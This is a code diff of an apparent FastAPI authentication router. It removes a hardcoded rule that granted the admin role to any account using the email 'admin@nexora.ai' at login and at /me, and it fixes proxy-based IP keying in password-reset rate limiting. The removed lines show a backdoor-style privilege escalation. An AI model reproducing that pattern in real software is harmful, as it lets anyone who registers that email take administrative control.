@@ -16,7 +16,7 @@ from app.schemas import (
     UserRegister, UserUpdate, GoogleAuthRequest,
 )
 from app.services.mailer import get_mailer
-from app.services.rate_limit import password_reset_limiter
+from app.services.rate_limit import client_ip, password_reset_limiter
 from app.auth import hash_password, verify_password, create_access_token, get_current_user
 
 router = APIRouter(prefix="/api/auth", tags=["Auth"])
@@ -52,10 +52,6 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
             detail="Incorrect email or password",
             headers={"WWW-Authenticate": "Bearer"},
         )
-    if user.email == "admin@nexora.ai" and user.role != "admin":
-        user.role = "admin"
-        db.commit()
-        db.refresh(user)
     # Serialize through UserRead — TokenResponse.user must be JSON-serializable,
     # and passing the raw SQLAlchemy ORM object crashes pydantic serialization.
     return TokenResponse(
@@ -182,12 +178,15 @@ def forgot_password(
     """Always return the same result to avoid turning this endpoint into an
     account-enumeration oracle."""
     email_key = payload.email.lower()
-    client_ip = request.client.host if request.client else "unknown"
+    # Behind the host's proxy, request.client.host is the proxy — keying on it
+    # made every user share one reset budget. The per-email limit below is the
+    # guard that cannot be spoofed.
+    ip = client_ip(request)
     allowed = password_reset_limiter.allow(
         f"reset:email:{email_key}", settings.PASSWORD_RESET_RATE_LIMIT,
         settings.PASSWORD_RESET_RATE_WINDOW_SECONDS,
     ) and password_reset_limiter.allow(
-        f"reset:ip:{client_ip}", settings.PASSWORD_RESET_RATE_LIMIT,
+        f"reset:ip:{ip}", settings.PASSWORD_RESET_RATE_LIMIT,
         settings.PASSWORD_RESET_RATE_WINDOW_SECONDS,
     )
     user = db.query(User).filter(User.email == payload.email).first() if allowed else None
@@ -246,11 +245,7 @@ def reset_password(payload: ResetPasswordRequest, db: Session = Depends(get_db))
     return {"success": True}
 
 @router.get("/me", response_model=UserRead)
-def read_me(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
-    if current_user.email == "admin@nexora.ai" and current_user.role != "admin":
-        current_user.role = "admin"
-        db.commit()
-        db.refresh(current_user)
+def read_me(current_user: User = Depends(get_current_user)):
     return current_user
 
 @router.patch("/me", response_model=UserRead)
